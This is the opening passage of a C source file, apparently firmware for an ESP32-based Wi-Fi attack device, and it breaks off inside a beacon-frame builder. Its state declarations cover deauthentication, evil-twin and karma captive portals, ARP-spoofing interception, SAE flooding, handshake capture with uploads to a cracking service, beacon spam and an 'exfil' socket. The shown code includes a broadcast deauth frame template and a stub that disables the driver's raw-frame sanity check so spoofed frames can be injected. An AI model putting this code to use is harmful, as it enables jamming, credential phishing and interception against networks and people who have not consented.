// main.c
#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <stdlib.h>
#include <inttypes.h>
#include <errno.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <limits.h>

#include "esp_heap_caps.h"
#include "esp_psram.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_system.h"
#include "esp_log.h"
#include "esp_err.h"

#include "nvs_flash.h"
#include "nvs.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_event.h"

#include "esp_mac.h"

#include "esp_console.h"
#include "argtable3/argtable3.h"

#include "driver/uart.h"
#include "driver/sdmmc_host.h"
#include "driver/sdspi_host.h"
#include "driver/spi_master.h"
#include "esp_vfs_fat.h"
#include "sdmmc_cmd.h"
#include <dirent.h>

#include "driver/gpio.h"

#include "led_strip.h"

#include "esp_random.h"
#include "mbedtls/ecp.h"
#include "mbedtls/bignum.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/entropy.h"
#include "mbedtls/base64.h"
#include "esp_timer.h"
#include "esp_app_format.h"

#include "esp_http_server.h"
#include "esp_http_client.h"
#include "esp_tls.h"
#include "esp_https_ota.h"
#include "esp_ota_ops.h"
#include "esp_crt_bundle.h"
#include "cJSON.h"
#include "esp_netif.h"
#include "lwip/err.h"
#include "lwip/sys.h"
#include "lwip/netdb.h"
#include "lwip/dns.h"
#include "lwip/dhcp.h"
#include "lwip/etharp.h"
#include "lwip/netif.h"
#include "lwip/ip_addr.h"
#include "lwip/ip4_addr.h"
#include "lwip/prot/ethernet.h"
#include "lwip/pbuf.h"
#include "lwip/sockets.h"
#include "linenoise/linenoise.h"
#include "esp_netif_net_stack.h"

#include "attack_handshake.h"
#include "hccapx_serializer.h"
#include "pcap_serializer.h"
#include "frame_analyzer_parser.h"
#include "frame_analyzer_types.h"
#include "sniffer.h"
#include "oled_display.h"
#include <math.h>

// NimBLE includes for BLE scanning
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/util/util.h"

#include "esp_rom_sys.h"
#include "soc/soc.h"

#if defined(__has_include)
#if __has_include("soc/rtc_cntl_reg.h")
#include "soc/rtc_cntl_reg.h"
#define HAS_RTC_CNTL_REG 1
#endif
#if __has_include("soc/lp_aon_reg.h")
#include "soc/lp_aon_reg.h"
#define HAS_LP_AON_REG 1
#endif
#endif
#ifndef HAS_RTC_CNTL_REG
#define HAS_RTC_CNTL_REG 0
#endif
#ifndef HAS_LP_AON_REG
#define HAS_LP_AON_REG 0
#endif

//Version number
#define JANOS_VERSION "1.6.0"

#define OTA_GITHUB_OWNER "C5Lab"
#define OTA_GITHUB_REPO "projectZero"
#define OTA_ASSET_NAME "projectZero.bin"
#define OTA_HTTP_MAX_BODY (256 * 1024)
#define OTA_TASK_STACK_SIZE 8192
#define OTA_TASK_PRIORITY 5
#define OTA_CHANNEL_MAX_LEN 8
#define OTA_NVS_NAMESPACE "ota"
#define OTA_NVS_KEY_CHANNEL "channel"
#define OTA_DEV_BRANCH "development"
#define OTA_PROJECT_NAME "projectZero"

// WPA-SEC cloud upload
#define WPASEC_NVS_NAMESPACE "wpasec"
#define WPASEC_NVS_KEY       "api_key"
#define WPASEC_URL           "https://wpa-sec.stanev.org/"
#define WPASEC_KEY_MAX_LEN   65

// WiGLE cloud upload
#define WIGLE_NVS_NAMESPACE "wigle"
#define WIGLE_NVS_KEY_NAME  "api_name"
#define WIGLE_NVS_KEY_TOKEN "api_token"
#define WIGLE_URL           "https://api.wigle.net/api/v2/file/upload"
#define WIGLE_KEY_MAX_LEN   65

// WDGWars cloud upload
#define WDGWARS_NVS_NAMESPACE "wdgwars"
#define WDGWARS_NVS_KEY       "api_key"
#define WDGWARS_URL           "https://wdgwars.pl/api/upload-csv"
#define WDGWARS_KEY_MAX_LEN   65

#define DISPLAY_NVS_NAMESPACE "display"
#define DISPLAY_NVS_KEY_MODE  "mode"



#define NEOPIXEL_GPIO      27
#define LED_COUNT          1
#define RMT_RES_HZ         (10 * 1000 * 1000)  // 10 MHz

// Boot/flash button (GPIO28) starts sniffer dog on tap, blackout on long-press
#define BOOT_BUTTON_GPIO               28
#define BOOT_BUTTON_TASK_STACK_SIZE    2048
#define BOOT_ACTION_TASK_STACK_SIZE    6144
#define BOOT_BUTTON_TASK_PRIORITY      5
#define BOOT_BUTTON_POLL_DELAY_MS      20
#define BOOT_BUTTON_LONG_PRESS_MS      1000

// GPS UART pins (Marauder compatible)
#define GPS_UART_NUM       UART_NUM_1
#define GPS_TX_PIN         13
#define GPS_RX_PIN         14
#define GPS_BUF_SIZE       1024
#define GPS_BAUD_ATGM336H  9600
#define GPS_BAUD_M5STACK   115200

// SD Card SPI pins (Marauder compatible)
#define SD_MISO_PIN        2
#define SD_MOSI_PIN        7  
#define SD_CLK_PIN         6
#define SD_CS_PIN          10

#define MY_LOG_INFO(tag, fmt, ...) printf("" fmt "\n", ##__VA_ARGS__)

#define MAX_AP_CNT 64
#define MAX_CLIENTS_PER_AP 50
#define MAX_SNIFFER_APS 100
#define MAX_PROBE_REQUESTS 200

static const uint8_t channel_view_24ghz_channels[] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
static const uint8_t channel_view_5ghz_channels[] = {
    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};

#define CHANNEL_VIEW_24GHZ_CHANNEL_COUNT \
    (sizeof(channel_view_24ghz_channels) / sizeof(channel_view_24ghz_channels[0]))
#define CHANNEL_VIEW_5GHZ_CHANNEL_COUNT \
    (sizeof(channel_view_5ghz_channels) / sizeof(channel_view_5ghz_channels[0]))
#define CHANNEL_VIEW_SCAN_DELAY_MS 2000
#define CHANNEL_VIEW_SCAN_TIMEOUT_ITERATIONS 200

static const char *TAG = "projectZero";

// Probe request data structure
typedef struct {
    uint8_t mac[6];
    char ssid[33];
    int rssi;
    uint32_t last_seen;
} probe_request_t;

// Target BSSID structure for channel monitoring
typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    uint32_t last_seen;
    bool active;
} target_bssid_t;

// Selected stations (clients) for targeted deauth
typedef struct {
    uint8_t mac[6];
    bool active;
} selected_station_t;

// Sniffer data structures
typedef struct {
    uint8_t mac[6];
    int rssi;
    uint32_t last_seen;
} sniffer_client_t;

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    wifi_auth_mode_t authmode;
    int rssi;
    sniffer_client_t clients[MAX_CLIENTS_PER_AP];
    int client_count;
    uint32_t last_seen;
} sniffer_ap_t;

// GPS data structure
typedef struct {
    float latitude;
    float longitude;
    float altitude;
    float accuracy;
    int satellites;
    bool valid;
} gps_data_t;

typedef enum {
    GPS_MODULE_ATGM336H = 0,
    GPS_MODULE_M5STACK_GPS_V11 = 1,
    GPS_MODULE_EXTERNAL = 2,
    GPS_MODULE_EXTERNAL_CAP = 3,
    // Backward compatibility alias for previously exposed name.
    GPS_MODULE_USB_TAB = GPS_MODULE_EXTERNAL,
    GPS_MODULE_CAP = GPS_MODULE_EXTERNAL_CAP,
} gps_module_t;

// Wardrive state
static bool wardrive_active = false;
static int wardrive_file_counter = 1;
static gps_data_t current_gps = {0};
static gps_data_t external_gps_position = {0};
static gps_data_t external_cap_gps_position = {0};
static bool gps_uart_initialized = false;
static gps_module_t current_gps_module = GPS_MODULE_ATGM336H;
static volatile bool gps_raw_active = false;
static bool wardrive_promisc_trace_enabled = false;
static char wardrive_promisc_trace_path[96] = "";

// Global stop flag for all operations
static volatile bool operation_stop_requested = false;

// wifi_connect command state: 0 = pending, 1 = success, -1 = failed
static volatile int wifi_connect_result = 0;

// WPA-SEC API key (loaded from NVS on boot)
static char wpasec_api_key[WPASEC_KEY_MAX_LEN] = "";
static char wigle_api_name[WIGLE_KEY_MAX_LEN] = "";
static char wigle_api_token[WIGLE_KEY_MAX_LEN] = "";
static char wdgwars_api_key[WDGWARS_KEY_MAX_LEN] = "";

// ARP ban state
static volatile bool arp_ban_active = false;
static TaskHandle_t arp_ban_task_handle = NULL;
static uint8_t arp_ban_target_mac[6];
static ip4_addr_t arp_ban_target_ip;
static uint8_t arp_ban_gateway_mac[6];
static ip4_addr_t arp_ban_gateway_ip;

// Sniffer state (allocated in PSRAM)
static sniffer_ap_t *sniffer_aps = NULL;                    // ~75 KB in PSRAM
static int sniffer_ap_count = 0;
static volatile bool sniffer_active = false;
static volatile bool sniffer_scan_phase = false;
static int sniff_debug = 0; // Debug flag for detailed packet logging
static bool sniffer_selected_mode = false; // Flag for selected networks mode
static int sniffer_selected_channels[MAX_AP_CNT]; // Unique channels from selected networks
static int sniffer_selected_channels_count = 0; // Number of unique channels

// Packet monitor state
static volatile bool packet_monitor_active = false;
static volatile uint32_t packet_monitor_total = 0;
static TaskHandle_t packet_monitor_task_handle = NULL;
static uint8_t packet_monitor_prev_primary = 1;
static wifi_second_chan_t packet_monitor_prev_secondary = WIFI_SECOND_CHAN_NONE;
static bool packet_monitor_has_prev_channel = false;
static bool packet_monitor_promiscuous_owned = false;
static bool packet_monitor_callback_installed = false;

// Channel view monitor state
static volatile bool channel_view_active = false;
static volatile bool channel_view_scan_mode = false;
static TaskHandle_t channel_view_task_handle = NULL;

// Probe request storage (allocated in PSRAM)
static probe_request_t *probe_requests = NULL;              // ~9.4 KB in PSRAM
static int probe_request_count = 0;

// Channel hopping for sniffer (like Marauder dual-band)
static int sniffer_current_channel = 1;
static int sniffer_channel_index = 0;
static int64_t sniffer_last_channel_hop = 0;
static const int sniffer_channel_hop_delay_ms = 250; // 250ms per channel like Marauder
// Sniffer OLED shared state (callback -> task)
static volatile uint32_t sniff_oled_packets = 0;
static volatile bool sniff_oled_dirty = false;
static TaskHandle_t sniffer_channel_task_handle = NULL;
static uint32_t sniffer_packet_counter = 0;
static uint32_t sniffer_last_debug_packet = 0;

// PCAP capture state
typedef enum {
    PCAP_MODE_NONE = 0,
    PCAP_MODE_RADIO,
    PCAP_MODE_NET
} pcap_capture_mode_t;

typedef struct {
    uint16_t len;
    int64_t timestamp_us;
    uint8_t data[];
} pcap_queued_frame_t;

static volatile bool pcap_capture_active = false;
static pcap_capture_mode_t pcap_capture_mode = PCAP_MODE_NONE;
static FILE *pcap_capture_file = NULL;
static TaskHandle_t pcap_writer_task_handle = NULL;
static QueueHandle_t pcap_packet_queue = NULL;
static uint32_t pcap_capture_frame_count = 0;
static uint32_t pcap_capture_drop_count = 0;
static char pcap_capture_filepath[64];
static netif_input_fn pcap_original_input = NULL;
static netif_linkoutput_fn pcap_original_linkoutput = NULL;

// PCAP ARP spoofing state (net mode MITM)
#define PCAP_ARP_MAX_HOSTS 64

typedef struct {
    uint8_t mac[6];
    uint32_t ip;
} pcap_arp_host_t;

static TaskHandle_t pcap_arp_task_handle = NULL;
static volatile bool pcap_arp_active = false;
static pcap_arp_host_t pcap_arp_hosts[PCAP_ARP_MAX_HOSTS];
static int pcap_arp_host_count = 0;
static uint8_t pcap_arp_gateway_mac[6];
static uint32_t pcap_arp_gateway_ip = 0;
static uint8_t pcap_arp_own_mac[6];

// Deauth/Evil Twin attack task
static TaskHandle_t deauth_attack_task_handle = NULL;
static volatile bool deauth_attack_active = false;

// Blackout attack task
static TaskHandle_t blackout_attack_task_handle = NULL;
static volatile bool blackout_attack_active = false;

// Target BSSID monitoring (allocated in PSRAM)
#define MAX_TARGET_BSSIDS 50
static target_bssid_t *target_bssids = NULL;                // ~2.3 KB in PSRAM
static int target_bssid_count = 0;

// Selected stations for targeted deauth (allocated in PSRAM)
#define MAX_SELECTED_STATIONS 32
static selected_station_t *selected_stations = NULL;
static int selected_stations_count = 0;
static uint32_t last_channel_check_time = 0;
static const uint32_t CHANNEL_CHECK_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes
static volatile bool periodic_rescan_in_progress = false; // Flag to suppress logs during periodic re-scans

// Client tracking for Evil Twin portal
static volatile int portal_connected_clients = 0;

// SAE Overflow attack task
static TaskHandle_t sae_attack_task_handle = NULL;
static volatile bool sae_attack_active = false;

// Sniffer Dog attack task
static TaskHandle_t sniffer_dog_task_handle = NULL;
static volatile bool sniffer_dog_active = false;
static int sniffer_dog_current_channel = 1;
static int sniffer_dog_channel_index = 0;
static int64_t sniffer_dog_last_channel_hop = 0;
// Sniffer Dog OLED shared state (callback -> task)
static volatile char sd_oled_ap[18] = {0};
static volatile char sd_oled_sta[18] = {0};
static volatile int  sd_oled_ch = 0;
static volatile int  sd_oled_rssi = 0;
static volatile uint32_t sd_oled_count = 0;
static volatile bool sd_oled_dirty = false;

// Deauth detector task
static TaskHandle_t deauth_detector_task_handle = NULL;
static volatile bool deauth_detector_active = false;
static int deauth_detector_current_channel = 1;
static int deauth_detector_channel_index = 0;
static int64_t deauth_detector_last_channel_hop = 0;
// Deauth detector OLED shared state (callback -> task)
static volatile char dd_oled_ssid[22] = {0};
static volatile char dd_oled_bssid[18] = {0};
static volatile int  dd_oled_ch = 0;
static volatile int  dd_oled_rssi = 0;
static volatile uint32_t dd_oled_count = 0;
static volatile bool dd_oled_dirty = false;
// Deauth detector selected mode
static bool deauth_detector_selected_mode = false;
static int deauth_detector_selected_channels[MAX_AP_CNT];
static int deauth_detector_selected_channels_count = 0;

// Wardrive task
static TaskHandle_t gps_raw_task_handle = NULL;
static TaskHandle_t wardrive_task_handle = NULL;

// Handshake attack task
static TaskHandle_t handshake_attack_task_handle = NULL;
static volatile bool handshake_attack_active = false;
static bool handshake_selected_mode = false; // true if networks were selected, false for scan-all mode
static wifi_ap_record_t *handshake_targets = NULL;          // ~6.4 KB in PSRAM
static int handshake_target_count = 0;
static bool handshake_captured[MAX_AP_CNT]; // Track which networks have captured handshakes
static int handshake_current_index = 0;

// ============================================================================
// Sniffer-based Handshake Attack with D-UCB Channel Selection (scan-all mode)
// ============================================================================

#define HS_MAX_APS      64
#define HS_MAX_CLIENTS  128
#define DUCB_GAMMA      0.99    // Discount factor (recent observations matter more)
#define DUCB_C          1.0     // Exploration constant
#define HS_DEAUTH_COOLDOWN_US  (10 * 1000000LL)  // 10s cooldown between deauths per client
#define HS_DWELL_TIME_MS       400                // Time spent on each channel
#define HS_STATS_INTERVAL_US   (30 * 1000000LL)   // Log stats every 30s

// D-UCB state per channel
typedef struct {
    int channel;
    double discounted_reward;   // Σ γ^(t-s) * reward_s
    double discounted_pulls;    // Σ γ^(t-s) * 1 (for this arm)
    int total_pulls;            // total times this channel was selected
} ducb_channel_t;

// Multi-AP handshake target (discovered from sniffing)
typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    wifi_auth_mode_t authmode;
    int rssi;
    bool captured_m1, captured_m2, captured_m3, captured_m4;
    bool complete;
    bool beacon_captured;
    bool has_existing_file;     // Already captured on SD
    int64_t last_deauth_us;
} hs_ap_target_t;

// Client discovered by sniffing
typedef struct {
    uint8_t mac[6];
    int hs_ap_index;            // index into hs_ap_targets[]
    int rssi;
    int64_t last_seen_us;
    int64_t last_deauth_us;
    bool deauthed;
} hs_client_entry_t;

// Sniffer handshake state
static hs_ap_target_t *hs_ap_targets = NULL;     // PSRAM
static int hs_ap_count = 0;
static hs_client_entry_t *hs_clients = NULL;      // PSRAM
static int hs_client_count = 0;
static ducb_channel_t *ducb_channels = NULL;       // PSRAM
static int ducb_channel_count = 0;
static double ducb_discounted_total = 0.0;         // Σ γ^(t-s) across all arms

// Per-dwell reward counters (reset each dwell)
static volatile int hs_dwell_new_clients = 0;
static volatile int hs_dwell_eapol_frames = 0;

// Beacon spam task
static TaskHandle_t beacon_spam_task_handle = NULL;
static volatile bool beacon_spam_active = false;
#define MAX_BEACON_SSIDS 32
static char beacon_ssids[MAX_BEACON_SSIDS][33];
static int beacon_ssid_count = 0;

// Channel lists for 2.4GHz and 5GHz
static const uint8_t channels_24ghz[] = {1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13};
static const uint8_t channels_5ghz[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
#define NUM_CHANNELS_24GHZ (sizeof(channels_24ghz) / sizeof(channels_24ghz[0]))
#define NUM_CHANNELS_5GHZ (sizeof(channels_5ghz) / sizeof(channels_5ghz[0]))

// Portal state
static httpd_handle_t portal_server = NULL;
static volatile bool portal_active = false;
static volatile bool karma_mode_active = false;
static volatile bool rogueap_mode_active = false;
static TaskHandle_t dns_server_task_handle = NULL;
static int dns_server_socket = -1;

// DarkSword state
static volatile bool darksword_active = false;
static TaskHandle_t darksword_exfil_task_handle = NULL;
static int darksword_exfil_socket = -1;
static char *darksword_html = NULL;
static size_t darksword_html_len = 0;
static bool darksword_html_gzipped = false;

static TaskHandle_t boot_button_task_handle = NULL;
static TaskHandle_t boot_action_task_handle = NULL;

// DNS server configuration
#define DNS_PORT 53
#define DNS_MAX_PACKET_SIZE 512

// Dual-band channel list (2.4GHz + 5GHz like Marauder)
static const int dual_band_channels[] = {
    // 2.4GHz channels
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
    // 5GHz channels
    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
    132, 136, 140, 144, 149, 153, 157, 161, 165
};
static const int dual_band_channels_count = sizeof(dual_band_channels) / sizeof(dual_band_channels[0]);

// ============================================================================
// Wardrive Promisc: Kismet-style tiered channel lists + D-UCB
// ============================================================================

static const uint8_t wdp_ch_24_primary[]   = {1, 6, 11};
static const uint8_t wdp_ch_24_secondary[] = {2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
static const uint8_t wdp_ch_5_non_dfs[]    = {36, 40, 44, 48, 149, 153, 157, 161, 165};
static const uint8_t wdp_ch_5_dfs[]        = {52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 169, 173, 177};

#define WDP_CH_24_PRIMARY_COUNT   (sizeof(wdp_ch_24_primary) / sizeof(wdp_ch_24_primary[0]))
#define WDP_CH_24_SECONDARY_COUNT (sizeof(wdp_ch_24_secondary) / sizeof(wdp_ch_24_secondary[0]))
#define WDP_CH_5_NON_DFS_COUNT    (sizeof(wdp_ch_5_non_dfs) / sizeof(wdp_ch_5_non_dfs[0]))
#define WDP_CH_5_DFS_COUNT        (sizeof(wdp_ch_5_dfs) / sizeof(wdp_ch_5_dfs[0]))
#define WDP_TOTAL_CHANNELS        (WDP_CH_24_PRIMARY_COUNT + WDP_CH_24_SECONDARY_COUNT + WDP_CH_5_NON_DFS_COUNT + WDP_CH_5_DFS_COUNT)

#define WDP_DUCB_GAMMA            0.99
#define WDP_DUCB_C                1.0
#define WDP_DWELL_PRIMARY_MS      500
#define WDP_DWELL_DEFAULT_MS      400
#define WDP_DWELL_DFS_MS          250
#define WDP_INITIAL_CAPACITY      256
#define WDP_PSRAM_RESERVE_BYTES   (64 * 1024)
#define WDP_STATS_INTERVAL_US     (30 * 1000000LL)
#define WDP_FILE_FLUSH_INTERVAL   50

typedef enum {
    WDP_TIER_24_PRIMARY,
    WDP_TIER_24_SECONDARY,
    WDP_TIER_5_NON_DFS,
    WDP_TIER_5_DFS,
} wdp_channel_tier_t;

typedef struct {
    int channel;
    wdp_channel_tier_t tier;
    double discounted_reward;
    double discounted_pulls;
    int total_pulls;
} wdp_ducb_channel_t;

typedef struct {
    uint8_t  bssid[6];
    char     ssid[33];
    uint8_t  channel;
    int8_t   rssi;
    wifi_auth_mode_t authmode;
    bool     written_to_file;
} wdp_network_t;

static bool wardrive_promisc_active = false;
static TaskHandle_t wardrive_promisc_task_handle = NULL;
static wdp_ducb_channel_t wdp_ducb_channels[WDP_TOTAL_CHANNELS];
static int wdp_ducb_channel_count = 0;
static double wdp_ducb_discounted_total = 0.0;
static wdp_network_t *wdp_seen_networks = NULL;
static volatile int wdp_seen_count = 0;
static volatile int wdp_seen_capacity = 0;
static volatile bool wdp_needs_grow = false;
static volatile int wdp_dwell_new_networks = 0;

// ============================================================================
// Radio Mode State (lazy initialization)
// ============================================================================

typedef enum {
    RADIO_MODE_NONE,
    RADIO_MODE_WIFI,
    RADIO_MODE_BLE
} radio_mode_t;

static radio_mode_t current_radio_mode = RADIO_MODE_NONE;
static bool wifi_initialized = false;
static bool netif_initialized = false;
static bool event_loop_initialized = false;
static esp_netif_t *sta_netif_handle = NULL;
static bool wifi_event_handler_registered = false;
static bool ip_event_handler_registered = false;
static bool ota_check_started = false;
static bool ota_check_in_progress = false;
static char ota_channel[OTA_CHANNEL_MAX_LEN] = "main";
static bool ota_auto_on_ip = false;
static TaskHandle_t ota_led_task_handle = NULL;
static volatile bool ota_led_active = false;

// ============================================================================
// Memory logging helper (set LOG_MEMORY_INFO to 1 to enable prints)
// ============================================================================
#ifndef LOG_MEMORY_INFO
#define LOG_MEMORY_INFO 1
#endif

static void log_memory_info(const char *context)
{
#if LOG_MEMORY_INFO
    size_t internal_free = heap_caps_get_free_size(MALLOC_CAP_INTERNAL);
    size_t internal_total = heap_caps_get_total_size(MALLOC_CAP_INTERNAL);
    size_t dma_free = heap_caps_get_free_size(MALLOC_CAP_DMA);
    size_t dma_total = heap_caps_get_total_size(MALLOC_CAP_DMA);
    size_t psram_free = heap_caps_get_free_size(MALLOC_CAP_SPIRAM);
    size_t psram_total = heap_caps_get_total_size(MALLOC_CAP_SPIRAM);
    
    MY_LOG_INFO(TAG, "[MEM] %s: Internal=%u/%uKB, DMA=%u/%uKB, PSRAM=%u/%uKB",
           context,
           (unsigned)(internal_free / 1024), (unsigned)(internal_total / 1024),
           (unsigned)(dma_free / 1024), (unsigned)(dma_total / 1024),
           (unsigned)(psram_free / 1024), (unsigned)(psram_total / 1024));
#else
    (void)context;
#endif
}

// ============================================================================
// BLE Scanner state (NimBLE)
// ============================================================================

// Apple Company ID (Little Endian)
#define APPLE_COMPANY_ID        0x004C
// Samsung Company ID (Little Endian)
#define SAMSUNG_COMPANY_ID      0x0075
// Apple Find My Network device type (AirTag, AirPods, etc.)
#define APPLE_FIND_MY_TYPE      0x12

// BLE scan state
static volatile bool bt_scan_active = false;
static volatile bool bt_airtag_scan_active = false;
static TaskHandle_t bt_scan_task_handle = NULL;
static volatile bool nimble_initialized = false;

// BLE device tracking for deduplication
#define BT_INITIAL_CAPACITY 128
static uint8_t (*bt_found_devices)[6] = NULL;
static int bt_found_device_count = 0;
static int bt_found_device_capacity = 0;

// AirTag/SmartTag counters
static int bt_airtag_count = 0;
static int bt_smarttag_count = 0;

// Generic BT device storage for scan_bt command
typedef struct {
    uint8_t addr[6];
    int8_t rssi;
    char name[32];
    uint16_t company_id;
    bool is_airtag;
    bool is_smarttag;
} bt_device_info_t;

static bt_device_info_t *bt_devices = NULL;                 // ~5.5 KB in PSRAM
static int bt_device_count = 0;
static int bt_device_capacity = 0;

// MAC tracking mode for scan_bt with argument
static bool bt_tracking_mode = false;
static uint8_t bt_tracking_mac[6];
static int8_t bt_tracking_rssi = 0;
static bool bt_tracking_found = false;
static char bt_tracking_name[32] = "";

// ============================================================================

// Promiscuous filter (like Marauder)
static const wifi_promiscuous_filter_t sniffer_filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

// Wardrive buffers (static to avoid stack overflow)
static char wardrive_gps_buffer[GPS_BUF_SIZE];
static wifi_ap_record_t *wardrive_scan_results = NULL;      // ~6.4 KB in PSRAM

// Configurable scan channel time (in ms)
static uint32_t g_scan_min_channel_time = 100;
static uint32_t g_scan_max_channel_time = 300;

#define SCAN_TIME_NVS_NAMESPACE "scancfg"
#define SCAN_TIME_NVS_KEY_MIN   "min_time"
#define SCAN_TIME_NVS_KEY_MAX   "max_time"

#define CHANNEL_TIME_MIN_LIMIT 1500   // max allowed value for min_channel_time
#define CHANNEL_TIME_MAX_LIMIT 2000   // max allowed value for max_channel_time

#define FAST_SCAN_MIN_TIME 100   // Fast scan min channel time (ms) - used by blackout/handshake
#define FAST_SCAN_MAX_TIME 300   // Fast scan max channel time (ms) - used by blackout/handshake

static void channel_time_persist_state(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(SCAN_TIME_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Channel time NVS open failed: %s", esp_err_to_name(err));
        return;
    }
    err = nvs_set_u32(handle, SCAN_TIME_NVS_KEY_MIN, g_scan_min_channel_time);
    if (err == ESP_OK) {
        err = nvs_set_u32(handle, SCAN_TIME_NVS_KEY_MAX, g_scan_max_channel_time);
    }
    if (err == ESP_OK) {
        err = nvs_commit(handle);
    }
    nvs_close(handle);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Channel time NVS save failed: %s", esp_err_to_name(err));
    }
}

static void channel_time_load_state_from_nvs(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(SCAN_TIME_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err == ESP_ERR_NVS_NOT_FOUND) {
        return;
    }
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Channel time NVS read open failed: %s", esp_err_to_name(err));
        return;
    }
    uint32_t min_val = 0, max_val = 0;
    err = nvs_get_u32(handle, SCAN_TIME_NVS_KEY_MIN, &min_val);
    if (err == ESP_OK && min_val >= 1 && min_val <= CHANNEL_TIME_MIN_LIMIT) {
        g_scan_min_channel_time = min_val;
    }
    err = nvs_get_u32(handle, SCAN_TIME_NVS_KEY_MAX, &max_val);
    if (err == ESP_OK && max_val >= 1 && max_val <= CHANNEL_TIME_MAX_LIMIT) {
        g_scan_max_channel_time = max_val;
    }
    nvs_close(handle);
}

// Calculate dynamic scan timeout based on channel times
// 14 channels (2.4 GHz) + 5 second buffer for overhead
static int get_scan_timeout_iterations(void) {
    int max_scan_duration_ms = (14 * g_scan_max_channel_time) + 15000;  // 15s buffer for scan overhead
    return max_scan_duration_ms / 100; // 100ms per iteration
}

/**
 * @brief Deauthentication frame template
 */
uint8_t deauth_frame_default[] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication (0xC0)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender (BSSID AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID AP
    0x00, 0x00,                         // Seq Control
    0x01, 0x00                          // Reason: Unspecified (0x0001)
};

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_DEBUG);


    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
    if (err == ESP_ERR_NO_MEM) {
        //give it a breath:
        vTaskDelay(pdMS_TO_TICKS(20));
        MY_LOG_INFO(TAG, "esp_wifi_80211_tx returned ESP_ERR_NO_MEM: %d", heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
        return; // lub ponów próbę później
    }

    //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false));
}

/**
 * Build a beacon frame with specified SSID
 * Returns the size of the beacon frame
 */
static int build_beacon_frame(uint8_t *frame_buffer, size_t buffer_size, const char *ssid, const uint8_t *bssid, uint8_t channel) {
    if (!frame_buffer || !ssid || !bssid || buffer_size < 200) {
        return 0;
    }

    int ssid_len = strlen(ssid);
    if (ssid_len > 32) {
        ssid_len = 32;
    }

    int pos = 0;

    // Frame Control: Type=Management(0), Subtype=Beacon(8) = 0x80
    frame_buffer[pos++] = 0x80;
    frame_buffer[pos++] = 0x00;

    // Duration
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;

    // Destination Address (broadcast)
    memset(&frame_buffer[pos], 0xFF, 6);
    pos += 6;

    // Source Address (BSSID)
    memcpy(&frame_buffer[pos], bssid, 6);
    pos += 6;

    // BSSID
    memcpy(&frame_buffer[pos], bssid, 6);
    pos += 6;

    // Sequence Control
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;

    // Beacon Frame Body
    // Timestamp (8 bytes)
    uint64_t timestamp = esp_timer_get_time();
    memcpy(&frame_buffer[pos], &timestamp, 8);
    pos += 8;

    // Beacon Interval (100 TU = 102.4 ms)
    frame_buffer[pos++] = 0x64;
    frame_buffer[pos++] = 0x00;

    // Capability Info (ESS, no privacy)
    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = 0x00;

    // Tagged parameters
    // SSID parameter set
    frame_buffer[pos++] = 0x00; // Tag: SSID
    frame_buffer[pos++] = ssid_len; // Length
    memcpy(&frame_buffer[pos], ssid, ssid_len);
    pos += ssid_len;

    // Supported Rates
    frame_buffer[pos++] = 0x01; // Tag: Supported Rates
    frame_buffer[pos++] = 0x08; // Length
    frame_buffer[pos++] = 0x82; // 1 Mbps (basic)
    frame_buffer[pos++] = 0x84; // 2 Mbps (basic)
    frame_buffer[pos++] = 0x8B; // 5.5 Mbps (basic)
    frame_buffer[pos++] = 0x96; // 11 Mbps (basic)
    frame_buffer[pos++] = 0x24; // 18 Mbps
    frame_buffer[pos++] = 0x30; // 24 Mbps
    frame_buffer[pos++] = 0x48; // 36 Mbps
    frame_buffer[pos++] = 0x6C; // 54 Mbps

    // DS Parameter Set (channel)
    frame_buffer[pos++] = 0x03; // Tag: DS Parameter
    frame_buffer[pos++] = 0x01; // Length
    frame_buffer[pos++] = channel; // Channel from parameter

